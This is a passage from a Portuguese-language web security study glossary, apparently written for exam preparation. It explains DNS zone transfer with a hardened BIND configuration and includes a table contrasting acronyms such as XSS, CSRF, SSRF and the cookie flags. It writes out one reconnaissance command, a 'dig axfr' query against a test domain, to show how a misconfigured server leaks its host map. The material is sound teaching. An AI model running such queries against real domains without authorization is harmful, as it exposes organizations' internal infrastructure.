- **Exemplo de utilização**: Manter o navegador Google Chrome, o sistema operacional e as dependências de servidor (`npm audit`, SCA — *Software Composition Analysis*) constantemente atualizados reduz a janela de exposição assim que um *Zero-Day* recebe correção oficial (passando a ser catalogado com um código **CVE**).

##### Zone Transfer (Transferência de Zona DNS — AXFR)
- **Nome**: DNS Zone Transfer (Transferência de Zona DNS — consulta tipo `AXFR` / `IXFR` na **porta 53 TCP**).
- **Significado**: Mecanismo administrativo do protocolo DNS (operando sobre **TCP na porta 53**) projetado para replicar o banco de dados completo de registros DNS de um domínio (todos os subdomínios `A`, `AAAA`, `CNAME`, `MX`, `TXT`, servidores internos de homologação, etc.) de um servidor DNS primário (*Primary/Master*) para um servidor DNS secundário (*Secondary/Slave*). **Problema clássico de segurança**: se um servidor DNS autoritativo estiver mal configurado e permitir requisições `AXFR` vindas de qualquer endereço IP da Internet pública, um atacante pode executar um único comando (`dig axfr exemplo.test @ns1.exemplo.test`) e baixar instantaneamente o mapa completo de todos os hosts e subdomínios internos da organização (*Information Disclosure* / Reconhecimento). A configuração segura (**[REQUISITO]**) restringe o `allow-transfer` exclusivamente aos endereços IP dos servidores DNS secundários autorizados, autenticados com chaves **TSIG** (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: Consultar um nome no DNS normal (`dig A`) é perguntar à telefonista o ramal de uma pessoa específica; já a **Transferência de Zona (`AXFR`)** é pedir à telefonista uma fotocópia do livro inteiro com o nome, sala e telefone secreto de todos os funcionários e departamentos da empresa.
- **Exemplo de utilização**: Restringindo a transferência de zona DNS no servidor BIND (`named.conf`) apenas ao servidor secundário autorizado:
  ```text
  zone "exemplo.test" {
      type master;
      file "/etc/bind/db.exemplo.test";
      allow-transfer { 198.51.100.20; }; // Bloqueia AXFR para o resto do mundo
  };
  ```

---

<a id="s8-indice"></a>
### 8.26 Quadro Comparativo de Siglas Parecidas (Anti-Pegadinhas de Prova)

Para consolidar a consulta do glossário, a tabela abaixo contrasta os pares e grupos de siglas que as bancas examinadoras mais utilizam para criar alternativas distratoras em questões de múltipla escolha e verdadeiro/falso:

| Grupo de Siglas | Diferença Técnica Essencial (Para Não Confundir na Prova) | Seção de Referência |
| :--- | :--- | :--- |
| **Autenticação (`401`)** vs. **Autorização (`403`)** | **Autenticação (AuthN)** responde *"Quem é você?"* (falha retorna `401 Unauthorized`). **Autorização (AuthZ)** responde *"O que você tem permissão para fazer?"* após já estar identificado (falha retorna `403 Forbidden`). | [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1) |
| **SOP** vs. **CORS** | **SOP (Same-Origin Policy)** é a restrição padrão do navegador que **bloqueia leituras** entre origens diferentes (`esquema + host + porta`). **CORS** é o mecanismo de headers HTTP (`Access-Control-Allow-Origin`) pelo qual o servidor **relaxa seletivamente a SOP** para origens autorizadas. | [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1) / [Headers](./05-headers-de-seguranca.md#s5) |
| **COOP** vs. **COEP** vs. **CORP** | **COOP** isola a janela principal contra referências `window.opener` cross-origin. **COEP** exige permissão explícita para que a página incorpore sub-recursos cross-origin (junto com COOP ativa `crossOriginIsolated`). **CORP** protege um recurso específico do servidor contra ser carregado por `<img>`/`<script>` de outras origens. | [Headers de Segurança](./05-headers-de-seguranca.md#s5) |
| **XSS** vs. **CSRF** vs. **SSRF** | **XSS** injeta JavaScript malicioso que roda no navegador da vítima (explora a confiança do usuário no site). **CSRF** faz o navegador da vítima enviar uma requisição não intencional aproveitando cookies ativos (explora a confiança do servidor no navegador). **SSRF** faz o *próprio servidor back-end* disparar requisições para a rede interna/nuvem (`127.0.0.1`, `169.254.169.254`). | [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3) |
| **Session Hijacking** vs. **Session Fixation** | **Session Fixation** ocorre *antes* do login: o atacante planta um `session_id` conhecido e o servidor falha ao não regenerá-lo quando a vítima autentica. **Session Hijacking** ocorre *após* o login: o atacante rouba um token de sessão já ativo (via XSS sem `HttpOnly`, rede sem `Secure`/HTTPS ou vazamento em URL). | [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3) |
| **Local Storage** vs. **Session Storage** vs. **Cookie `HttpOnly`** | **Local Storage** persiste em disco sem expiração e é compartilhado entre abas da mesma origem. **Session Storage** dura apenas enquanto a aba estiver aberta e é isolado por aba. **Ambos são lidos por JS (vulneráveis a XSS)**. Já o **Cookie `HttpOnly`** é inacessível a `document.cookie` (protegido contra leitura direta via XSS). | [Application](./02b-devtools-application.md#s2-2) |
| **`HttpOnly`** vs. **`Secure`** vs. **`SameSite`** | **`HttpOnly`** proíbe leitura do cookie via JavaScript (`document.cookie` — mitiga roubo por XSS). **`Secure`** exige transmissão exclusiva sobre HTTPS cifrado (mitiga sniffing em rede). **`SameSite` (`Strict`/`Lax`/`None`)** controla o envio do cookie em requisições cross-site (mitiga CSRF). | [Application](./02b-devtools-application.md#s2-2) |
| **Forward Proxy** vs. **Reverse Proxy** | **Forward Proxy** fica na borda da rede do **cliente**, fazendo requisições para a Internet em nome dos usuários internos e ocultando o IP dos clientes. **Reverse Proxy** (ex.: Nginx, Cloudflare) fica na frente do **servidor**, recebendo conexões da Internet e ocultando/protegendo os servidores de origem. | [Redes de Computadores](./04-redes-de-computadores.md#s4) |
| **DNSSEC** vs. **DoH / DoT** | **DNSSEC** assina digitalmente os registros DNS garantindo **autenticidade e integridade** (contra *DNS Spoofing*), mas **não cifra** a consulta. **DoH (porta 443)** e **DoT (porta 853)** encapsulam o DNS em TLS garantindo **confidencialidade** (contra espionagem na rede). | [Fundamentos](./01a-fundamentos-web-parte1.md#s1) / [Redes](./04-redes-de-computadores.md#s4) |
| **Codificação (Base64URL)** vs. **Hash (SHA-256 / Bcrypt)** vs. **Criptografia (AES-GCM)** | **Codificação (Base64URL)** é pública e instantaneamente reversível sem chave (usada no header/payload do JWT). **Hash** é unidirecional/irreversível (usado para senhas com *salt* no Bcrypt/Argon2id e para integridade SRI). **Criptografia** é reversível apenas por quem possui a chave secreta/privada (usada no TLS/HTTPS). | [Fundamentos](./01a-fundamentos-web-parte1.md#s1) / [Vulnerabilidades](./03a-vulnerabilidades-parte1.md#s3) |

---

---

> [⬅️ 6 e 7. Checklist de Auditoria e Comparativo](./06-checklist-e-comparativo.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [9 e 10. Simulado (65 Questões) e Referências ➡️](./08-simulado-e-referencias.md)
